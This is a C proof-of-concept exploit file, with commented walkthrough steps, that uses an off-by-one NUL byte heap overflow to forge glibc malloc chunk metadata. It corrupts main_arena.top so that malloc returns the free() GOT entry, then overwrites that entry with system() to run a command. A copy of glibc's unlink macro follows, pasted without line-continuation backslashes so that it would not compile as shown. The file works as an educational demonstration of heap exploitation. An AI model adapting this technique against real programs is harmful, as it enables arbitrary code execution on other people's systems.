#include <fcntl.h>
#include <stdlib.h>
#include <string.h>

//Libc a change ! read wapiflapi article pour les recents

int main(int argc, const char* argv[])
{
  // The exploit eventually finishes by overwriting the GOT entry for free().
  size_t aout_bss_base = 0x601000;
  size_t aout_bss_free_got_offset = 0x18;
  size_t heap_base = 0x602000;
  // Towards the end, the exploit overwrites the main malloc metadata structure,
  // specifically the "top" member.
  size_t libc_bss_base = 0x7ffff7dd6000;
  size_t libc_bss_main_arena_top_offset = 0x7b8;
  // Of course, we use the "system" function for the payload.
  size_t libc_base = 0x7ffff7a1e000;
  size_t libc_system_offset = 0x42cf0;

  char* p = malloc(1024 - 8);
  char* p2 = malloc(1024 - 16);
  char* p_end = malloc(32);
  char* pwin;
  int fd;
  unsigned int len;
  // This eventually will be passed to system(). We replace the free() GOT
  // entry with system() so that the free(some buffer) becomes
  // system(some buffer). Here were are populating the content for
  // "some buffer".
  strcpy(p_end, "gnome-calculator");
  // This actually does the off-by-one NUL byte overwrite.
  memset(p, '0', 1024 - 8 + 1);
  memset(p2, '0', 1024 - 16);

  // We're now setting up some "fake" malloc metadata structures which will be
  // used in the free() below.
  // When we overflowed "p" by the single NUL byte, we effectively clear the
  // bit that marks "p" as being in-use. Since "p" is now marked as free,
  // free()'ing "p2" will attempt to coalesce the free chunk with "p". This
  // will involve reading the "prev_size" field from the end of "p", which we
  // set to 0 via the memset() above. The effect of a 0 size "prev_size" is
  // that the memory content at the start of "p2" is interpreted as a malloc
  // chunk header, which is "P2" in the comments below.

  // P2->fd: the forward linked list linkage of our fake metadata.
  *(size_t*)&p2[0] = (size_t)(p2 + 64);
  // P2->bk: the back linked list linkage of our fake metadata.
  *(size_t*)&p2[8] = (size_t)(p2 + 128);
  // P2->fd_nextsize: this value is written to by a hijacked linked list
  // operation. We set it up to write to main_arena.top.
  *(size_t*)&p2[16] = libc_bss_base + libc_bss_main_arena_top_offset - 0x28;
  // P2->bk_nextsize: value to write into main_arena.top. The value must itself
  // be _writeable_. This is why we cannot directly replace the free() GOT with
  // an address to system(): the address of system() is itself not writable
  // because it is in the code section.
  // Set up to write value that is just before the free() got entry.
  *(size_t*)&p2[24] = aout_bss_base + aout_bss_free_got_offset - 0x10;
  // P2->fd->bk: this must point back to P2 to pass a linked list integrity
  // check.
  *(size_t*)&p2[64 + 24] = (size_t) (p2 - 0x10);
  // P2->fd->fd_nextsize. Must be non-NULL. Not dereferenced.
  *(size_t*)&p2[64 + 32] = 0x4141414141414141;
  // P2->bk->fd: this most point back to P2 to pass a linked list integrity
  // check.
  *(size_t*)&p2[128 + 16] = (size_t) (p2 - 0x10);

  // Does the magic. Writes a value that is the address of the free() GOT, into
  // main_arena.top.
  free(p2);

  malloc(1024 - 16);  // Consume the allocation we just freed.

  // Right! Now that main_arena.top points to the free() GOT, and that the heap
  // is "full", the next allocation will return a pointer to the free() GOT.
  pwin = malloc(8);
  // Write the system() address into the free() GOT address.
  *(size_t*)pwin = libc_base + libc_system_offset;
  // Now any call to free() will cause the contents of the free()'d buffer to
  // be interpreted as an argument to system() ;-)
  free(p_end);
}


#define unlink(P, BK, FD) 
{                                            
  FD = P->fd;                                                                      
  BK = P->bk;                                                                      
  if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                
    malloc_printerr (check_action, "corrupted double-linked list", P);      
  else 
  {                                                                      
    FD->bk = BK;                                                              
    BK->fd = FD;     
    //16 * 64 = 1024                                                         
    if (!in_smallbin_range (P->size) && __builtin_expect (P->fd_nextsize != NULL, 0)) 
    {                                    
      if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0) || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    
        malloc_printerr (check_action, "corrupted double-linked list (not small)", P);
      if (FD->fd_nextsize == NULL) 
      {                                                  
        if (P->fd_nextsize == P)                                      
          FD->fd_nextsize = FD->bk_nextsize = FD;                      
        else 
        {                                                              
          FD->fd_nextsize = P->fd_nextsize;                              
          FD->bk_nextsize = P->bk_nextsize;                              
          P->fd_nextsize->bk_nextsize = FD;                              
          P->bk_nextsize->fd_nextsize = FD;                              
        }                                                              
      } 
      else 
      {                                                              
        P->fd_nextsize->bk_nextsize = P->bk_nextsize;                      
        P->bk_nextsize->fd_nextsize = P->fd_nextsize;                      
      }                                                                      
    }                                                                      
  }                                                                              
}